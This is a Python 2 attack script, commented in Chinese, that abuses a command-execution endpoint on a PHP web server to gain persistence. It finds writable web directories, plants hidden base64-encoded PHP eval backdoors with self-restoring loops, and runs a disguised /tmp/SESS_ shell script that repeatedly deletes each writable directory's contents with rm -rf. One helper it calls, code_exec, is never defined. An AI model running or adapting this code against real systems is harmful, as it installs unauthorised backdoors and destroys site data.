#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 通过任意命令执行达到权限维持的效果

import requests
import random
import string
import hashlib

timeout = 1

def random_string(length):
    return "".join([random.choice(string.letters) for i in range(length)])

def shell_exec(url, command):
    flag = random_string(0x10)
    data = {
        "c":"%s && echo '%s'" % (command, flag)
    }
    try:
        response = requests.post(url, data=data, timeout=timeout)
        content = response.content
        print "[+] Content : "
        print content
        if flag in content:
            return content.replace("\n%s\n" % (flag), "")
        return content
    except Exception as e:
        print "[-] %s" % (e)

def get_writable_dir(url, root):
    command = "find %s -type d -writable" % (root)
    print "[+] Executing : [%s]" % (command)
    content = shell_exec(url, command)
    result = content.split("\n")
    print result
    return result

def write_memery_webshell(url, directory, password):
    sleep_time = 500 # micro second
    code = "<?php $content = '<?php eval($_REQUEST[%s]);?>'; $writable_path = '%s'; $filename = '.%s.php'; $path = $writable_path.'/'.$filename; ignore_user_abort(true); set_time_limit(0); while(true){ if(file_get_contents($path) != $content){ file_put_contents($path, $content); } usleep(%d); }?>" % (password, directory, password, sleep_time)
    filename = ".%s.php" % (password)
    path = "%s/%s" % (directory, filename)
    payload = "file_put_contents('%s', base64_decode('%s'));" % (path, code.encode("base64").replace("\n", ""))
    return code_exec(url, payload).split("\n")[0:-1]

def active_memery_webshell(url):
    try:
        requests.get(url, timeout=0.5)
    except:
        print "[+] OK!"

def get_password(host, port):
    return hashlib.md5(host + ":" + port).hexdigest()

def main():
    host = "127.0.0.1"
    port = "80"
    url = "http://%s:%s/c.php" % (host, port)
    root = "/var/www/html"
    password = get_password(host, port)
    print "[+] Getting writable dirs..."
    writable_dirs = get_writable_dir(url, root)
    print "[+] Writable dirs : "
    print writable_dirs
    for writable_dir in writable_dirs:
        commands = []
        fake_filename = random_string(0x10)
        filename = "SESS_%s" % (fake_filename)
        path = "/tmp/%s" % (filename)
        real_command = "#!/bin/sh\n"
        real_command += "\n"
        real_command += "while :\n"
        real_command += "do\n"
        real_command += "rm -rf %s/*\n" % (writable_dir)
        real_command += "echo '%s' | base64 -d > %s\n" % (("<?php eval($_REQUEST[%s]);?>" % (password)).encode("base64").replace("\n", ""), "%s/.%s.php" % (writable_dir, password))
        real_command += "sleep 0.1\n"
        real_command += "done\n"
        commands.append("rm -rf %s" % (path))
        commands.append("echo '%s' | base64 -d > %s" % (real_command.encode("base64").replace("\n",""), path))
        commands.append("chmod o+x %s" % (path))
        commands.append("bash -x %s" % (path))
        for command in commands:
            shell_exec(url, command)

if __name__ == "__main__":
    main()
